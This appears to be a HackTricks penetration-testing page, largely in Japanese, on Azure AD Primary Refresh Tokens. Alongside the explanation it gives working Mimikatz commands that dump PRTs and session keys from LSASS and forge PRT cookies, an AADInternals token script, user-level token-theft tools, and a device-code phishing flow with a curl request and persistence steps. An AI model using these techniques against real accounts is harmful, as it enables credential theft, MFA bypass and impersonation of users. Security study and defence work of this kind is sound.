# Az - Primary Refresh Token (PRT)

{{#include ../../../banners/hacktricks-training.md}}

## What is a Primary Refresh Token (PRT)?

**Primary Refresh Token (PRT)**は、Azure AD (Entra ID) 認証で使用される長寿命のリフレッシュトークンで、Kerberos TGTに類似しています。これは、Azure ADに参加したデバイスでユーザーがログインすると発行され、資格情報を再入力することなくさまざまなアプリケーションのアクセストークンを要求するために使用できます。各PRTには、**セッションキー**（所有証明キーとも呼ばれる）が付随しており、リクエストに署名し、クライアントがPRTを持っていることを証明するために使用される対称キーです。PRT自体は不透明で暗号化されたバイナリデータ（クライアントが読み取れない）であり、セッションキーはトークンを要求する際にPRTを含むJWTを**署名**するために使用されます。言い換えれば、PRTを持っているだけでは不十分であり、攻撃者は正当性を証明するためにセッションキーを必要とします。これは、認証のためにKerberos TGTとそのセッションキーの両方が必要なことに似ています。

Windowsでは、PRTとセッションキーはCloudAPプラグインを介してLSASSプロセスにキャッシュされます。デバイスに**TPM**（Trusted Platform Module）がある場合、Azure ADは追加のセキュリティのためにキーをTPMにバインドします。これは、TPMを搭載したデバイスでは、セッションキーがTPM内に保存または使用され、通常の状況下ではメモリから直接読み取ることができないことを意味します。TPMが利用できない場合（例：多くのVMや古いシステム）、キーはソフトウェアに保持され、DPAPI暗号化で保護されます。いずれの場合も、管理者権限またはマシン上でのコード実行を持つ攻撃者は、ポストエクスプロイトの一環として**メモリからPRTとセッションキーをダンプする**ことを試み、その後それらを使用してクラウド内でユーザーを偽装することができます。一般的なリフレッシュトークン（通常はアプリケーション固有）とは異なり、PRTはより広範で、デバイスがほぼすべてのEntra ID統合リソースまたはサービスのトークンを要求できるようにします。

## How Does a PRT Work?

PRTの動作を簡略化して説明します：

1.  **Device Registration:**

-   デバイス（Windowsラップトップやモバイルフォンなど）がEntra IDに参加または登録するとき、資格情報（ユーザー名/パスワード/MFA）を使用して認証します。

-   認証が成功すると、Entra IDは特にデバイスにバインドされたPRTを発行します。

2.  **Token Storage:**

-   PRTはデバイスに安全に保存され、通常はTrusted Platform Module (TPM)などのハードウェア機能によって保護されており、無許可の第三者が抽出または悪用することが難しくなっています。

3.  **Single Sign-On (SSO):**

-   Entra IDで保護されたアプリケーション（例：Microsoft 365アプリ、SharePoint、Teams）にアクセスするたびに、デバイスは保存されたPRTを静かに使用して、そのアプリの特定のアクセストークンを要求し取得します。

-   PRTが認証を透過的に処理するため、資格情報を繰り返し入力する必要はありません。

4.  **Renewal and Security:**

-   PRTは長い寿命（通常約14日）を持ちますが、デバイスがアクティブに使用されている限り、継続的に更新されます。

-   デバイスが侵害されたり失われたりした場合、管理者はリモートでPRTを取り消し、無許可のアクセスを即座にブロックできます。

### Why are PRTs Powerful?

-   **Universal Access:** 一般的なトークンが1つのアプリやリソースに制限されるのに対し、PRTはすべてのEntra ID統合サービスへのアクセスを促進できます。

-   **Enhanced Security:** TPMなどのハードウェア保護が組み込まれているため、PRTは安全なトークンの保存と使用を保証します。

-   **User Experience:** PRTは頻繁な認証プロンプトを減らし、真のシームレスSSOを可能にすることで、ユーザーエクスペリエンスを大幅に向上させます。

## How to know if a PRT is present?

- PRTが存在するか確認する:
```bash
# Execute
dsregcmd /status
## Check if the value of AzureAdPrt is set to YES
```
- TPMによって保護されているか確認する:
```bash
Get-Tpm | Select TpmPresent,TpmReady,TpmEnabled,TpmOwned
# TpmPresent/Ready = True indicates the device can bind secrets to TPM.

dsregcmd /status
# In Device State / WHfB prerequisites you’ll typically see:
# KeyProvider = Microsoft Platform Crypto Provider ⇒ TPM hardware key;
# KeyProvider = Software Key Storage Provider ⇒ not TPM‑bound.
# Some builds also show TpmProtected: YES/NO and KeySignTest (run elevated to test).
```
## Dump and user unprotected PRTs

According to [this post](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/) on Windows devices **TPMバインディングなし**、PRTとそのセッションキーはLSASS（CloudAPプラグイン）に存在します。そのデバイスでローカル管理者/SYSTEM権限があれば、PRTブロブとDPAPIで暗号化されたセッションキーは**LSASSから読み取ることができ、DPAPIを介してセッションキーを復号し、署名キーを導出**して有効なPRTクッキー（`x‑ms‑RefreshTokenCredential`）を生成できます。PRTとそのセッションキーの両方が必要です—PRT文字列だけでは不十分です。

### Mimikatz
```bash
privilege::debug
sekurlsa::cloudap
```
**PRTフィールド**には、暗号化されたリフレッシュトークン（通常はbase64文字列）が含まれており、ProofOfPossessionKeyのKeyValueにはDPAPIで暗号化されたセッションキー（これもbase64）が含まれています。

次に、**`sekurlsa::cloudap`**の出力から、`ProofOfPossessionKey`フィールド内の**`KeyValue`**からbase64ブロブをコピーします（これはDPAPIで暗号化されたセッションキーです）。この暗号化されたキーはそのまま使用することはできず、システムのDPAPI資格情報を使用して復号化する必要があります。

システムシークレットのDPAPI暗号化はマシンのシステムコンテキストを必要とするため、トークンをSYSTEMに昇格させ、MimikatzのDPAPIモジュールを使用して復号化します：
```bash
token::elevate
dpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
```
`token::elevate`はSYSTEMを偽装し、`dpapi::cloudapkd`コマンドの`/unprotect`はDPAPIマスターキーを使用して提供されたKeyValue blobを復号化します。これにより、平文のセッションキーと、署名に使用される関連するDerived KeyとContextが得られます：
- **Clear key** – 平文の32バイトセッションキー（16進数文字列として表現）。
- **Derived Key** – セッションキーとコンテキスト値から導出された32バイトキー（詳細は以下）。
- **Context** – PRTクッキーの署名キーを導出する際に使用された24バイトのランダムコンテキスト。

> [!NOTE]
> これがユーザーを偽装するために機能しない場合は、**`AADInternals`**を使用して次のセクションを確認してください。

その後、mimikatzを使用して有効なPRTクッキーを生成することもできます：
```bash
# Context is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# Derivedkey is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# PRT is obtained from sekurlsa::cloudap (filed "Prt"
dpapi::cloudapkd /context:<ContextHex> /derivedkey:<DerivedKeyHex> /prt:<PRT>
```
Mimikatzは、「Signature with key」という行の後に署名されたJWT（`PRT cookie`）を出力します。これにはPRTが含まれ、導出されたキーを使用して署名されています。このJWTはコピーされ、ウェブセッションで使用できます。たとえば、攻撃者はブラウザを開き、`login.microsoftonline.com`に移動し、`x-ms-RefreshTokenCredential`という名前のクッキーをこのJWTの値で設定できます。ブラウザがリフレッシュまたはナビゲートすると、Azure ADはセッションを認証済みとして扱い（PRTクッキーはSSOが発生したかのように提示されます）、指定されたリソースのために認可コードまたはアクセストークンを発行します。実際には、Office 365やAzureポータルのようなリソースに移動します。正当なPRTクッキーが存在する場合、Azure ADは追加のログインなしでアクセスを許可します（PRTはすでに認証されているため、MFAをバイパスします）。

また、**`roadtx`**および**`roadrecon`**をPRTクッキーのPRTとともに使用してユーザーを偽装することもできます *(TODO: Find the exact command lines to use roadtx/roadrecon to get credentials from a PRT)*。

### AADInternals

**`AADInternals`** PowerShellモジュールも、以前に取得したPRTとセッションキーを使用して有効なPRTトークンを生成するために使用できます。これは、nonceを使用して新しいPRTトークンを取得するプロセスを自動化するのに便利で、Azure AD Graph APIや他のリソースのためのアクセストークンを取得するために使用できます。
```bash
# Code from https://aadinternals.com/post/prt/
# Add the PRT to a variable
$MimikatzPRT = "MS5BVUVCNFdiUV9UZnV2RW13ajlEaFVoR2JCSWM3cWpodG9CZElzblY2TVdtSTJUdENBY1JCQVEuQWdBQkF3RUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQO...R0RjNFQ0QxaHJ1RFdJeHZUM0stWjJpQVhmMnBLeWpPaHBIOVc"

# Add padding
while($MimikatzPRT.Length % 4) {$MimikatzPRT += "="}

# Convert from Base 64
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Add the session key (Clear key) to a variable
$MimikatzKey = "7ee0b1f2eccbae440190bf0761bc52099ad7ae7d10d28bd83b67a81a0dfa0808"

# Convert to byte array and base 64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate a new PRTToken with nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey

# Get an access token for MS Graph API
Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
```
このプロセスは、新しいPRTクッキー（ノンス付き）を取得し、それを使用してAzure AD Graph APIのアクセストークンを取得します（ユーザーの代理としてクラウドアクセスを示しています）。AADInternalsは多くの暗号化を抽象化し、Windowsコンポーネントまたは独自のロジックを内部で使用します。

## 保護されたPRTの悪用

前述の保護にもかかわらず、すでにデバイスを侵害した攻撃者（ローカルユーザーまたはSYSTEMとして）は、WindowsのトークンブローカーAPIとセキュリティコンポーネントを利用して**新しいアクセストークンを取得するためにPRTを悪用する**ことができます。攻撃者は生のPRTやキーを**抽出する**のではなく、基本的に**「Windowsに自分の代理でPRTを使用するように頼む」**のです。以下のセクションでは、TPM保護が有効な最新のWindowsデバイスでPRTとそのセッショントークンを悪用するための現在有効な技術を概説します。これらの技術はすべて、ターゲットマシンへのポストエクスプロイトアクセスを前提としており、**組み込みの認証フローを悪用することに焦点を当てています**（未修正の脆弱性は必要ありません）。

### WindowsトークンブローカーアーキテクチャとSSOフロー

最新のWindowsは、ユーザーモードとLSASS（ローカルセキュリティ機関）の両方にコンポーネントを含む組み込みの**トークンブローカー**スタックを介してクラウド認証を処理します。このアーキテクチャの重要な部分は次のとおりです。

-   **LSASS CloudAPプラグイン：** デバイスがAzure ADに参加している場合、LSASSはPRTとトークンリクエストを管理するクラウド認証パッケージ（例：`CloudAP.dll`、`aadcloudap.dll`、`MicrosoftAccountCloudAP.dll`）をロードします。LSASS（SYSTEMとして実行）はPRTの保存、更新、使用を調整し、TPMとインターフェースを介して暗号操作（セッショントークンでPRTチャレンジに署名するなど）を実行します。

-   **Webアカウントマネージャー（WAM）：** Windows Webアカウントマネージャーは、アプリケーションやブラウザが資格情報を求めることなくクラウドアカウントのトークンを要求できるユーザーモードのフレームワーク（COM/WinRT APIを介してアクセス可能）です。WAMはユーザーアプリケーションとセキュアなLSASS/TPMバックのPRTとの間のブローカーとして機能します。たとえば、MicrosoftのMSALライブラリや特定のOSコンポーネントは、WAMを使用してログインユーザーのPRTを使用してトークンを静かに取得します。

-   **BrowserCore.exeとトークンブローカーCOMインターフェース：** ブラウザSSOのために、Windowsには**BrowserCore.exe**というコンポーネントが含まれています（*Windows Security\BrowserCore*の下にあります）。これは、ブラウザ（Edge、Chromeの拡張機能など）がAzure ADログインのためにPRT派生のSSOトークンを取得するために使用するネイティブメッセージングホストです。内部では、BrowserCoreは`MicrosoftAccountTokenProvider.dll`によって提供されるCOMオブジェクトを利用してPRTベースのクッキー/トークンを取得します。本質的に、このCOMインターフェースは、ユーザーとして実行されている任意のプロセスがSSOトークンを取得するために呼び出すことができるファーストパーティの「トークンブローカー」APIです（ユーザーがLSASSに有効なPRTを持っている場合）。

Azure ADに参加しているユーザーがリソース（たとえば、Azureポータル）にアクセスしようとすると、フローは通常次のようになります：アプリケーションがWAMまたはBrowserCoreのCOMインターフェースに呼び出し、これがLSASSと通信します。LSASSはPRTとセッショントークン（TPMによって保護されている）を使用して**SSOトークン**を生成します。これはしばしば**PRTクッキー**と呼ばれ、暗号化されたPRTとノンスを含む特別なJWTで、PRTのセッショントークンから派生したキーで署名されています。このクッキーはAzure ADに送信され（`x-ms-RefreshTokenCredential`ヘッダー内）、デバイスとユーザーが有効なPRTを保持していることを証明し、Azure ADがさまざまなアプリケーションの標準OAuthリフレッシュおよびアクセストークンを発行できるようにします。特に、PRTに存在する任意の多要素認証（MFA）要求は、このSSOプロセスを介して取得されたトークンに引き継がれるため、PRT派生のトークンはMFA保護されたリソースを満たすことができます。

### ユーザーレベルのトークン窃盗（非管理者）

攻撃者が**ユーザーレベルのコード実行**を持っている場合、PRTのTPM保護は攻撃者がトークンを取得するのを止めることはありません。攻撃者は**組み込みのWindowsトークンブローカーAPIを利用します**：

#### **BrowserCore（MicrosoftAccountTokenProvider COM）**

BrowserCoreはPRTクッキーを取得するためのCOMクラス（`MicrosoftAccountTokenProvider`、CLSID `{a9927f85-a304-4390-8b23-a75f1c668600}`）を公開しています。このCOM APIは、Azure AD SSOのためにブラウザ（Chrome/Edge拡張機能）によって正当に呼び出されます。

-   **[RequestAADRefreshToken](https://github.com/leechristensen/RequestAADRefreshToken)**
```bash
RequestAADRefreshToken.exe --uri https://login.microsoftonline.com
```
*(Azure AD リフレッシュトークンまたは PRT クッキーを返します)*

- **[ROADtoken](https://github.com/dirkjanm/ROADtoken)** & **[ROADtools](https://github.com/dirkjanm/ROADtools)**
```bash
ROADtoken.exe --nonce <nonce-value>
roadrecon auth --prt-cookie <cookie>
```
*(ノンスを生成し、BrowserCoreを呼び出してPRTクッキーを取得し、次にROADtoolsを介してそれを引き換えます)*


### **Web Account Manager (WAM) APIs**

攻撃者は、ユーザーレベルのプロセスから正当なMicrosoft認証ライブラリ（**MSAL**、**WAM APIs**、**WebAuthenticationCoreManager**）を使用して、TPM保護されたPRTを利用してトークンを静かに取得します。


-   **[aadprt](https://posts.specterops.io/)**
```bash
execute-assembly aadprt.exe
```
*(COMインターフェースを介してPRTクッキーを取得)*

-   **[listwamaccounts](https://posts.specterops.io/)**
```bash
execute-assembly listwamaccounts.exe
```
*(WAMを介してログインしているAzure ADアカウントのリスト; トークンターゲットを特定)*

-   **一般的な例 (MSALを使用したPowerShell)**:
```powershell
$app = [Microsoft.Identity.Client.PublicClientApplicationBuilder]::Create("client-id").Build()
$result = $app.AcquireTokenSilent(@("https://graph.microsoft.com/.default"), $app.GetAccountsAsync().Result[0]).ExecuteAsync().Result
$result.AccessToken
```
*(静かにPRTを利用してアクセストークンを取得)*

#### 管理者 / SYSTEMレベルのトークン悪用

攻撃者が**管理者またはSYSTEM**に昇格すると、任意のAzure ADにログインしているユーザーを直接偽装し、同じ**COM/WAMトークンブローカーAPI**を使用できます。TPM保護されたPRTは、この正当なトークン発行を防ぎません。

### **ユーザーの偽装とトークン取得**

Admin/SYSTEMは、他のユーザーの実行中のセッションを偽装して、トークン生成のためにBrowserCoreまたはWAMを呼び出すことができます。

これには、ユーザープロセス（例：`explorer.exe`）を偽装し、前のセクションでコメントされた任意の技術を使用してトークンブローカーAPIを呼び出します。

### **直接LSASSおよびトークンブローカーとの相互作用（高度な技術）**

管理者はLSASSを使用してPRTを悪用することができます。たとえば、管理者はLSASSにコードを注入したり、内部CloudAP関数を呼び出してLSASSにトークンを生成させることができます。Dirk-janの研究では、管理者が「暗号APIを使用してLSASS内のPRTキーと相互作用できる」と指摘されています。実際には、LSASSの独自の関数を使用して（APIフックやRPCなどの技術を介して、利用可能な場合）PRTクッキーを生成することを意味します。別のアプローチは、セッションキーがメモリに表示される可能性のあるウィンドウを悪用することです。たとえば、PRTの更新やデバイス登録の瞬間に、使用のために暗号化されていない状態で表示される場合です。このような攻撃はかなり複雑で状況依存です。より簡単な管理者の戦術は、既存のトークンハンドルやキャッシュを悪用することです。LSASSは、メモリ内のアプリ用に最近発行されたリフレッシュトークンをキャッシュします（DPAPIで暗号化されています）。決意のあるSYSTEM攻撃者は、これらのDPAPI保護されたトークンを抽出し（管理者が取得できるユーザーのマスターキーを使用して）、特定のアプリケーションのリフレッシュトークンを直接盗むことを試みることができます。しかし、最も簡単で一般的な方法は、偽装と文書化されたトークンブローカーインターフェースの使用であり、これによりAzure ADが新しいトークンを発行することが保証されます（すべての適切なクレームを持って）暗号を解読しようとするのではなく。

## PRTのフィッシング

**OAuthデバイスコード**フローを悪用し、**Microsoft Authentication BrokerクライアントID**（**`29d9ed98-a469-4536-ade2-f981bc1d605e`**）と**デバイス登録サービス（DRS）**リソースを使用して、**リフレッシュトークンを取得し、これをプライマリリフレッシュトークン（PRT）にアップグレード**します。

### **なぜこれが機能するのか**

-   **PRT**は**デバイスにバインドされており、（ほぼ）すべてのEntra保護アプリの**SSOを可能にします。
-   **Brokerクライアント + DRS**の組み合わせにより、フィッシングされた**リフレッシュトークン**を**PRTに交換**できます。
-   **MFAはバイパスされません**：ユーザーはフィッシング中に**MFAを実行**し、**MFAクレームが**結果として得られるPRTに伝播し、攻撃者が**さらなるプロンプトなしで**アプリにアクセスできるようにします。

**前提条件**：

-   **BrokerクライアントID**（`29d9ed98-a469-4536-ade2-f981bc1d605e`）と**DRSスコープ/リソース**を使用した**デバイスコードによるユーザー認証**（例：**`01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default`**または**`https://enrollment.manage.microsoft.com/`**）。
-   **ユーザーがEntra IDでデバイスを登録できる**（**デフォルト：許可**、ただし制限またはクォータ制限される可能性があります）。
-   **デバイスコードを無効にする**CAポリシーや、ターゲットアプリに対して**準拠/ハイブリッドデバイスを要求する**ポリシーがないこと（これらはPRTの発行を停止しませんが、保護されたアプリにアクセスするための**使用**をブロックします）。
-   **攻撃者が制御するホスト**でフローを実行し、トークン/デバイスキーを保持します。

**攻撃フロー**：

1.  **client_id = Broker**および**DRSスコープ/リソース**を使用して**デバイスコード認証を開始**し、**ユーザーコード**を犠牲者に表示します。
```bash
curl -s -X POST \
"https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode" \
-d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e" \
-d "scope=01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default offline_access openid profile"
```
2.  **被害者がMicrosoftのサイト**（正規のUI）にサインインし、**MFA**を完了すると、**攻撃者はBrokerクライアント用のDRSスコープ付きリフレッシュトークン**を受け取ります。

3.  **そのリフレッシュトークンを使用してテナントに不正なデバイスを登録**します（デバイスオブジェクトが作成され、被害者にリンクされます）。

4.  **リフレッシュトークン + デバイスID/キー**を交換して**PRTにアップグレード**します → **攻撃者のデバイスにバウンドされたPRT**。

5.  **（オプションの持続性）**: MFAが新鮮であれば、**長期的なパスワードレスアクセスを維持するためにWindows Hello for Businessキーを登録**します。

6.  **悪用**: **PRTを引き換え**（または**PRTクッキーを生成**）して、**ユーザーとしてExchange/Graph/SharePoint/Teams/カスタムアプリ**の**アクセストークン**を取得します。


### 公開ツールと概念実証

- [ROADtools/ROADtx](https://github.com/dirkjanm/ROADtools): OAuthフロー、デバイス登録、トークンアップグレードを自動化します。
- [DeviceCode2WinHello](https://github.com/kiwids0220/deviceCode2WinHello): デバイスコードフィッシングからPRT+WHfBキーへの単一コマンドスクリプトを自動化します。


## 参考文献

- [DirkjanのPRTに関するブログ投稿](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [DirkjanのPRTフィッシングに関する投稿](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [DirkjanのPRTの悪用に関する投稿](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- SpecterOpsの[Azure ADリクエストトークンの要求に関する投稿](https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30)
- [AADInternalsのPRTに関する投稿](https://aadinternals.com/post/prt/)
- [blog.3or.de](https://blog.3or.de/understanding-primary-refresh-tokens-and-cve-2021-33779-how-pass-the-prt-was-eliminated#:~:text=,the%20Token%20Broker%20on%20Windows)

{{#include ../../../banners/hacktricks-training.md}}
